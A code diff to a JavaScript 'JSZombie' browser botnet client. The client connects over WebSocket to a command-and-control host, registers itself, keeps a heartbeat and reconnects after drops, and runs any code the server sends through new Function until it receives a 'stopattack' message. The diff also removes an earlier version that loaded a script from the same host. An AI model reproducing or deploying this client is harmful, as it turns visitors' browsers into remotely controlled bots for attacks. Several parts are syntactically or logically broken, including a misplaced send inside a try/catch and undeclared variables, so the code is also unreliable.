@@ -3,58 +3,115 @@
 (function($){
 
 var zombie;
-var missed_heartbeats =0;
-var heartbeat_msg ="--heartbeat--";
 
+//client Zombie object
+/* utilized code from django WS4Redis project at https://github.com/jrief/django-websocket-redis.git*/
 function JSZombie(ip,handler){
 		//handler for Websocket messages
-		this.handler = handler;
 		//contact c&c server
-		this.makeContact=function(){
-			//create script to contact over with SOR
-			var script =document.createElement('script');
-			script.type = 'text/javascript';
-			script.src = 'http://'+ip+'/zombie/register';
-			script.id = "zombieconnect";
-			$("head:first").append(script);
+		var missed_heartbeats =0;
+		var heartbeat_msg ="--heartbeat--";
+		var ws = null;
+		var heartbeat_msg = "--heartbeat--";
+		var attempts = 1;
+		var must_reconnect = true;
+		var facility = String(Math.random());
+		var timer;
 
-			//handler for websocket creation
-			/*function start_connection(){
-				//if connection check is null
-				if(this.checker ==null){
-					//create check to test for connection at fixed interval
-					this.checker = setInterval(function(){
-							try{
-								//update missed heartbeats
-								missed_heartbeats++;
-								if(missed_heartbeats>=3)
-											throw new Error();
-								//message to server zombie is alive
-								this.websocket.send("alive");
-							}
-							catch(e){
-								//else destroy socket, lost connection to server
-								clearInterval(checker);
-								this.checker = null;
-								this.websocket.close();
-							}
-					},5000);
+		//establish websocket connection
+		function connect(){
+			try{
+				//create websocket with random facility
+				ws = new WebSocket('ws://'+ip+'/ws/'+facility+'?subscribe-session');
+				ws.onopen = function(e){
+					attempts = 1;
+					//notify server of facility
+					this.send(JSON.stringify({"endpoint":"register","facility":facility}));
+					//start to send heartbeat message
+					if(heartbeat_msg && heartbeat_interval == null){
+						missed_heartbeats = 0;
+						heartbeat_interval = setInterval(send_heartbeat,5000);
+					}
+
 				}
+				ws.onmessage = function(msg){
+					var msgJson = JSON.parse(msg);
+					//execute code
+					if(msgJson.hasOwnProperty('code')==true){
+						this.execute(msgJson);
 
+					}
+					//stop code
+					else if(msgJson.hasOwnProperty('stopattack')==true){
+						this.kill();
+					}
+					//receive heartbeat
+					else if(msg.data == heartbeat_msg){
+						missed_heartbeats =0;
+					}
+				}
+			}
+			catch(err){
+				try_to_reconnect();
+			}
+		}
+		//connect to server
+		connect();
+
+
+		function is_closing() {
+			return ws && ws.readyState === 2;
+		}
+
+		function is_closed() {
+			return ws && ws.readyState === 3;
+		}
+
+		function send_heartbeat(){
+			try{
+				missed_heartbeats++;
+				if(missed_heartbeats>3)
+					throw new Error();
+			}
+			ws.send(JSON.stringify({'heartbeat':heartbeat_msg});
+			catch(e){
+				clearInterval(heartbeat_interval);
+				heartbeat_interval = null;
+				if(!is_closing() && !is_closed()){
+					ws.close();
+					try_to_reconnect();
+				}
+			}
+		}
+
+		// this code is borrowed from http://blog.johnryding.com/post/78544969349/
+		//
+		// Generate an interval that is randomly between 0 and 2^k - 1, where k is
+		// the number of connection attmpts, with a maximum interval of 30 seconds,
+		// so it starts at 0 - 1 seconds and maxes out at 0 - 30 seconds
+		function generate_inteval(k) {
+			var maxInterval = (Math.pow(2, k) - 1) * 1000;
+
+			// If the generated interval is more than 30 seconds, truncate it down to 30 seconds.
+			if (maxInterval > 30*1000) {
+				maxInterval = 30*1000;
 			}
 
-			//handler for heartbeat receival
-			function check_connection(heartbeat){
-						missed_heartbeats=0;
-			}*/
-			//create websocket
-			this.websocket = WS4Redis({
-				uri:'ws://'+ip+'/ws/solo?subscribe-session',
-				connected: start_connection,
-				receive_message: handler,
-				heartbeat_msg: "--heartbeat--",
-			});
+			// generate the interval to a random number between 0 and the maxInterval determined from above
+			return Math.random() * maxInterval;
 		}
+
+		function try_to_reconnect() {
+			if (must_reconnect && !timer) {
+				// try to reconnect
+				var interval = generate_inteval(attempts);
+				timer = setTimeout(function() {
+					attempts++;
+					connect();
+				}, interval);
+			}
+		}
+
 		//execute code sent from server
 		this.execute = function(script){
 				code = new Function('args','window',script['code']);
@@ -69,27 +126,11 @@ function JSZombie(ip,handler){
 		}
 
 
-
 }
 
-//handler for socket responses
-function parseSocketResponse(msg){
-	var msgJson = JSON.parse(msg);
-	//execute code
-	if(msgJson.hasOwnProperty('code')==true){
-		zombie.execute(msgJson);
-
-	}
-	//stop code
-	else if(msgJson.hasOwnProperty('stopattack')==true){
-		zombie.kill();
-	}
-
-
-}
 //create zombie and connect
-zombie = new JSZombie(host,parseMalware);
-zombie.makeContact();
+zombie = new JSZombie(host);
+//zombie.makeContact();
 
 
 })(jQuery);
